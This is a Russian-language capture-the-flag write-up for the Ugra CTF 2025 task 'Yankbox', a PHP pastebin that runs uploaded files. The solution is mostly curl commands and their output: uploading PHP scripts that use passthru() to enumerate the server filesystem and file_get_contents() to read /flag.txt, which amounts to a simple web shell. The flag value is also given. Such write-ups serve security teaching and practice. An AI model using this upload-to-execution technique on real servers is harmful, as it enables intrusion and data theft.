# Yankbox: Write-up

Нас встречает минималистичная страница, которая рассказывает, как пользоваться Yankbox-ом.

```shell
$ curl -i https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3
HTTP/2 200 
server: nginx
date: Sat, 08 Mar 2025 17:00:50 GMT
content-type: text/html; charset=UTF-8
vary: Accept-Encoding
x-powered-by: PHP/8.4.1

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Pastebin</title>
    <!-- Не релевантно для решения -->
</head>
<body>

<h1>Pastebin</h1>
curl -F "file=@/path/to/your/file.jpg" https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3/

</body>
</html>
```

А, так это старый добрый PHP! Попробуем положить что-нибудь:

```shell
$ curl -F file=@/etc/os-release https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3
https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3/files/Zu1Z3F0yA8
$ curl https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3/files/Zu1Z3F0yA8
NAME="Arch Linux"
PRETTY_NAME="Arch Linux"
ID=arch
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://archlinux.org/"
DOCUMENTATION_URL="https://wiki.archlinux.org/"
SUPPORT_URL="https://bbs.archlinux.org/"
BUG_REPORT_URL="https://gitlab.archlinux.org/groups/archlinux/-/issues"
PRIVACY_POLICY_URL="https://terms.archlinux.org/docs/privacy-policy/"
LOGO=archlinux-logo
```

Хорошо. Попробуем проверить, исполняет ли оно подсунутые ему файлы. Начнём с тривиального `phpinfo`:

```shell
$ cat phpinfo.php
<?php phpinfo();
$ curl -F file=@phpinfo.php https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3
https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3/files/iHz5qy05YN.php
```

Открываем ссылку в браузере и видим, что защиты от исполнения никакой нет. Отлично.

Давайте посмотрим, что может предложить нам файловая система:

```shell
$ cat stage1.php
<?php
passthru("find / -xdev -exec stat -c'u=%u\tg=%g\t%a/%A\t%s\t%N' {} \+ | sort -k5");
$ curl $(curl -F "file=@stage1.php" https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3/) -o filesystem
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   376    0    72  100   304     99    418 --:--:-- --:--:-- --:--:--   517
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 72732    0 72732    0     0  37915      0 --:--:--  0:00:01 --:--:-- 37900
$ grep flag filesystem
u=65534 g=65534 644/-rw-r--r--  43  /flag.txt
```

Есть некий `/flag.txt`, который может читать кто угодно. Воспользуемся этим:

```shell
$ cat stage2.php
<?php
echo file_get_contents("/flag.txt");
$ curl $(curl -F "file=@stage2.php" https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3/)
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   329    0    72  100   257    295   1053 --:--:-- --:--:-- --:--:--  1353
ugra_thats_why_we_dont_use_php_a9w5eih7kjq2
```

Флаг: **ugra_thats_why_we_dont_use_php_a9w5eih7kjq2**

## Интересные факты

На нормальную версию этого pastebin-а можно посмотреть [тут](https://depot.4d2.org).

Команда из stage 1 эквивалентна `find / -xdev -ls` для coreutils, но не для busybox.

## Постмортем

У некоторых команд заканчивалось место для загрузки файлов, и сервис втихую переставал работать.
